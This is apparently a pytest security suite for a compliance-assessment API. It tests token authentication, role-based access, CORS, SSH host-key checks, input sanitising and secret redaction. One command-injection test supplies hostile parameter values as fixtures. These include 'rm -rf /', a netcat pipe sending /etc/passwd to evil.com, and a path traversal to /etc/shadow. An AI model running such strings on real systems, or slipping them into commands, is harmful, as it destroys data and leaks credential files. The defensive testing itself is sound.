import pytest
import os
import shlex
import paramiko
from starlette.testclient import TestClient
from unittest.mock import MagicMock, patch

from app.main import app
from app.config import settings
from app.auth import ROLE_ADMIN, ROLE_ENGINEER, ROLE_AUDITOR
from app.engine.runner.base import redact_secrets_from_string, sanitize_telemetry, TestResult
from app.engine.runner.ssh_runner import SSHRunner

TEST_ADMIN_TOKEN = "test-secret-admin-token-2026"
TEST_ENGINEER_TOKEN = "test-secret-engineer-token-2026"
TEST_AUDITOR_TOKEN = "test-secret-auditor-token-2026"


@pytest.fixture(autouse=True)
def configure_test_auth():
    """Configures explicit tokens for testing in a controlled manner."""
    orig_admin = settings.CAC_ADMIN_TOKEN
    orig_eng = settings.CAC_ENGINEER_TOKEN
    orig_aud = settings.CAC_AUDITOR_TOKEN
    orig_auth = settings.AUTH_ENABLED
    orig_bypass = settings.DEV_AUTH_BYPASS

    settings.CAC_ADMIN_TOKEN = TEST_ADMIN_TOKEN
    settings.CAC_ENGINEER_TOKEN = TEST_ENGINEER_TOKEN
    settings.CAC_AUDITOR_TOKEN = TEST_AUDITOR_TOKEN
    settings.AUTH_ENABLED = True
    settings.DEV_AUTH_BYPASS = False

    yield

    settings.CAC_ADMIN_TOKEN = orig_admin
    settings.CAC_ENGINEER_TOKEN = orig_eng
    settings.CAC_AUDITOR_TOKEN = orig_aud
    settings.AUTH_ENABLED = orig_auth
    settings.DEV_AUTH_BYPASS = orig_bypass


@pytest.fixture
def client():
    return TestClient(app)


# -----------------------------------------------------------------------------
# 1. AUTHENTICATION TESTS (401 UNAUTHORIZED)
# -----------------------------------------------------------------------------
def test_public_health_and_dashboard_do_not_require_auth(client):
    """Health check and dashboard shell must remain accessible without tokens."""
    r_health = client.get("/api/v1/health")
    assert r_health.status_code == 200
    assert r_health.json()["status"] == "healthy"

    r_dash = client.get("/dashboard")
    assert r_dash.status_code == 200


def test_unauthenticated_requests_fail_with_401(client):
    """All protected endpoints must reject unauthenticated requests with 401."""
    # Read endpoint
    r_overview = client.get("/api/v1/overview")
    assert r_overview.status_code == 401
    assert "Missing authentication credentials" in r_overview.json()["detail"]

    # Assessment endpoint
    r_run = client.post("/api/v1/orchestrator/run-all")
    assert r_run.status_code == 401

    # Chaos endpoint
    r_chaos = client.post("/api/v1/chaos/inject/pam-lockout-bypass")
    assert r_chaos.status_code == 401


def test_invalid_token_fails_with_401(client):
    """Requests with forged or incorrect tokens must fail with 401."""
    headers = {"Authorization": "Bearer forged-garbage-token"}
    r = client.get("/api/v1/overview", headers=headers)
    assert r.status_code == 401
    assert "Invalid authentication token" in r.json()["detail"]


def test_x_api_key_header_support(client):
    """X-API-Key header is accepted as an alternative to Bearer token."""
    headers = {"X-API-Key": TEST_AUDITOR_TOKEN}
    r = client.get("/api/v1/overview", headers=headers)
    assert r.status_code == 200


# -----------------------------------------------------------------------------
# 2. ROLE-BASED ACCESS CONTROL (403 FORBIDDEN)
# -----------------------------------------------------------------------------
def test_auditor_role_has_read_access_but_cannot_execute_or_mutate(client):
    """Auditors can read policies and overview, but cannot run assessments or chaos."""
    auditor_headers = {"Authorization": f"Bearer {TEST_AUDITOR_TOKEN}"}

    # Allowed: Read overview
    r_read = client.get("/api/v1/overview", headers=auditor_headers)
    assert r_read.status_code == 200

    # Forbidden: Execute assessment (requires engineer)
    r_exec = client.post("/api/v1/orchestrator/run-all", headers=auditor_headers)
    assert r_exec.status_code == 403
    assert "Insufficient privileges" in r_exec.json()["detail"]

    # Forbidden: Inject chaos (requires admin)
    r_chaos = client.post("/api/v1/chaos/inject/pam-lockout-bypass", headers=auditor_headers)
    assert r_chaos.status_code == 403


def test_engineer_role_can_execute_assessment_but_cannot_inject_chaos(client):
    """Engineers can execute assessments and update findings, but cannot run chaos."""
    eng_headers = {"Authorization": f"Bearer {TEST_ENGINEER_TOKEN}"}

    # Allowed: Read
    r_read = client.get("/api/v1/overview", headers=eng_headers)
    assert r_read.status_code == 200

    # Allowed: Run assessment asynchronously (default: returns 202 with task_id)
    r_exec = client.post("/api/v1/orchestrator/run-all?allow_simulation=true", headers=eng_headers)
    assert r_exec.status_code == 202
    assert "task_id" in r_exec.json()

    # Allowed: Run assessment synchronously (sync=true: returns 200 with result)
    r_sync = client.post("/api/v1/orchestrator/run-all?allow_simulation=true&sync=true", headers=eng_headers)
    assert r_sync.status_code == 200
    assert "assessment_id" in r_sync.json()

    # Forbidden: Inject chaos (requires admin)
    r_chaos = client.post("/api/v1/chaos/inject/pam-lockout-bypass", headers=eng_headers)
    assert r_chaos.status_code == 403


def test_admin_role_has_full_administrative_access(client):
    """Admins can access everything, including destructive chaos operations."""
    admin_headers = {"Authorization": f"Bearer {TEST_ADMIN_TOKEN}"}

    # Allowed: Read
    assert client.get("/api/v1/overview", headers=admin_headers).status_code == 200

    # Allowed: Inject simulated chaos
    r_inj = client.post("/api/v1/chaos/inject/pam-lockout-bypass?mode=SIMULATED", headers=admin_headers)
    assert r_inj.status_code == 200

    # Allowed: Restore baseline
    r_res = client.post("/api/v1/chaos/restore", headers=admin_headers)
    assert r_res.status_code == 200


# -----------------------------------------------------------------------------
# 3. CORS SECURITY CONFIGURATION
# -----------------------------------------------------------------------------
def test_cors_configuration_restricts_origins():
    """Verifies that CORS origins are strictly restricted and do not contain wildcard with credentials."""
    from app.config import settings
    assert "*" not in settings.CORS_ALLOWED_ORIGINS
    assert "http://localhost:8000" in settings.CORS_ALLOWED_ORIGINS


# -----------------------------------------------------------------------------
# 4. SSH HOST-KEY VERIFICATION & PARAMETER ESCAPING
# -----------------------------------------------------------------------------
def test_ssh_strict_host_key_rejection():
    """SSHRunner must reject connections when strict host key checking is on and host is untrusted."""
    runner = SSHRunner(host="192.168.56.101", port=22, username="auditor")

    orig_strict = settings.SSH_STRICT_HOST_KEY_CHECKING
    orig_file = settings.SSH_KNOWN_HOSTS_FILE
    settings.SSH_STRICT_HOST_KEY_CHECKING = True
    settings.SSH_KNOWN_HOSTS_FILE = "non_existent_known_hosts_file_test"

    try:
        with pytest.raises(paramiko.SSHException) as exc_info:
            runner._get_client()
        assert "host-key verification failed" in str(exc_info.value).lower() or "known_hosts" in str(exc_info.value).lower()
    finally:
        settings.SSH_STRICT_HOST_KEY_CHECKING = orig_strict
        settings.SSH_KNOWN_HOSTS_FILE = orig_file


def test_command_injection_prevention_on_ssh_probe():
    """Unsafe shell metacharacters in test spec parameters must be rejected immediately."""
    runner = SSHRunner()
    fake_client = MagicMock()

    # Attempt 1: Command injection via target_user
    malicious_spec_user = {
        "probe_action": "simulate_failed_logins",
        "target_user": "audit_canary; rm -rf /; touch /tmp/pwned",
        "attempt_count": 1
    }
    with pytest.raises(ValueError) as exc:
        runner._execute_tier2_probe(fake_client, "TEST-INJECT-1", malicious_spec_user, 0.0)
    assert "Unsafe target_user parameter rejected" in str(exc.value)

    # Attempt 2: Command injection via target_file
    malicious_spec_file = {
        "probe_action": "trigger_monitored_syscall",
        "target_file": "/etc/shadow; cat /etc/passwd | nc evil.com 1337",
        "expected_audit_key": "shadow_watch"
    }
    with pytest.raises(ValueError) as exc:
        runner._execute_tier2_probe(fake_client, "TEST-INJECT-2", malicious_spec_file, 0.0)
    assert "Unsafe target_file path rejected" in str(exc.value)

    # Attempt 3: Path traversal via target_file
    traversal_spec = {
        "probe_action": "trigger_monitored_syscall",
        "target_file": "/var/log/../../etc/shadow",
        "expected_audit_key": "shadow_watch"
    }
    with pytest.raises(ValueError) as exc:
        runner._execute_tier2_probe(fake_client, "TEST-INJECT-3", traversal_spec, 0.0)
    assert "Unsafe target_file path rejected" in str(exc.value)


# -----------------------------------------------------------------------------
# 5. SECRET REDACTION & TELEMETRY SANITIZATION
# -----------------------------------------------------------------------------
def test_secret_redaction_masks_passwords_and_tokens():
    """Verifies that secrets, passwords, URIs, and bearer tokens are masked from text."""
    raw_error = "Connection failed: postgresql://admin_user:SuperSecretPassword123@10.0.0.5:5432/db"
    redacted = redact_secrets_from_string(raw_error)
    assert "SuperSecretPassword123" not in redacted
    assert "postgresql://admin_user:***@10.0.0.5:5432/db" in redacted

    bearer_error = "Authentication header failed: Bearer secret_live_token_abc_12345"
    assert "secret_live_token_abc_12345" not in redact_secrets_from_string(bearer_error)
    assert "Bearer [REDACTED]" in redact_secrets_from_string(bearer_error)


def test_sanitize_telemetry_masks_nested_dictionary_keys():
    """Nested dictionaries with password/token keys must have values masked."""
    telemetry = {
        "host": "localhost",
        "db_config": {
            "user": "auditor",
            "password": "unmasked_password_here",
            "api_key": "sk-live-123456789"
        },
        "details": ["normal", "token: confidential_token_value"]
    }
    sanitized = sanitize_telemetry(telemetry)
    assert sanitized["db_config"]["password"] == "[REDACTED]"
    assert sanitized["db_config"]["api_key"] == "[REDACTED]"
    assert sanitized["host"] == "localhost"


def test_test_result_post_init_auto_sanitizes():
    """TestResult schema must automatically redact telemetry and error messages upon creation."""
    res = TestResult(
        test_id="TEST-SECRET-1",
        result_code=0,
        execution_status="FAILURE",
        evidence_provenance="LIVE_TARGET",
        tier=1,
        target_type="POSTGRES_DB",
        duration_ms=10,
        raw_telemetry={"db_password": "PlaintextPasswordHere", "exit_code": 1},
        error_message="Error: failed with password=PlaintextPasswordHere"
    )
    assert res.raw_telemetry["db_password"] == "[REDACTED]"
    assert "PlaintextPasswordHere" not in res.error_message
    assert "[REDACTED]" in res.error_message


# -----------------------------------------------------------------------------
# 6. AUTH SESSION STATUS & EXTENDED RBAC REGRESSION TESTS
# -----------------------------------------------------------------------------
def test_auth_me_endpoint_returns_caller_role(client):
    """Verifies that /api/v1/auth/me correctly identifies caller role and rejects unauthenticated."""
    # Unauthenticated -> 401
    r_unauth = client.get("/api/v1/auth/me")
    assert r_unauth.status_code == 401

    # Invalid token -> 401
    r_invalid = client.get("/api/v1/auth/me", headers={"Authorization": "Bearer bad-token"})
    assert r_invalid.status_code == 401

    # Auditor -> 200, role="auditor"
    r_aud = client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {TEST_AUDITOR_TOKEN}"})
    assert r_aud.status_code == 200
    assert r_aud.json()["role"] == ROLE_AUDITOR

    # Engineer -> 200, role="engineer"
    r_eng = client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {TEST_ENGINEER_TOKEN}"})
    assert r_eng.status_code == 200
    assert r_eng.json()["role"] == ROLE_ENGINEER

    # Admin -> 200, role="admin"
    r_adm = client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {TEST_ADMIN_TOKEN}"})
    assert r_adm.status_code == 200
    assert r_adm.json()["role"] == ROLE_ADMIN


def test_finding_update_rbac_auditor_rejected_with_403(client):
    """Auditors cannot mutate finding lifecycle; requires engineer or admin role."""
    auditor_headers = {"Authorization": f"Bearer {TEST_AUDITOR_TOKEN}"}
    r = client.patch(
        "/api/v1/findings/finding-test-uuid",
        headers=auditor_headers,
        json={"status": "RESOLVED", "remediation_notes": "Attempted by auditor"}
    )
    assert r.status_code == 403
    assert "Insufficient privileges" in r.json()["detail"]


def test_checkpoint_creation_rbac_restricted_to_admin(client):
    """Ledger checkpoint signing requires administrative credentials."""
    auditor_headers = {"Authorization": f"Bearer {TEST_AUDITOR_TOKEN}"}
    r_aud = client.post("/api/v1/ledger/checkpoint", headers=auditor_headers)
    assert r_aud.status_code == 403

    eng_headers = {"Authorization": f"Bearer {TEST_ENGINEER_TOKEN}"}
    r_eng = client.post("/api/v1/ledger/checkpoint", headers=eng_headers)
    assert r_eng.status_code == 403


def test_auth_tokens_not_exposed_in_api_responses(client):
    """Public and protected endpoints must never leak configured secret tokens."""
    admin_headers = {"Authorization": f"Bearer {TEST_ADMIN_TOKEN}"}

    # Health endpoint
    r_health = client.get("/api/v1/health")
    content_health = str(r_health.json())
    assert TEST_ADMIN_TOKEN not in content_health
    assert TEST_ENGINEER_TOKEN not in content_health
    assert TEST_AUDITOR_TOKEN not in content_health

    # Reports summary endpoint
    r_rep = client.get("/api/v1/reports/summary", headers=admin_headers)
    content_rep = str(r_rep.json())
    assert TEST_ADMIN_TOKEN not in content_rep
    assert TEST_ENGINEER_TOKEN not in content_rep
    assert TEST_AUDITOR_TOKEN not in content_rep

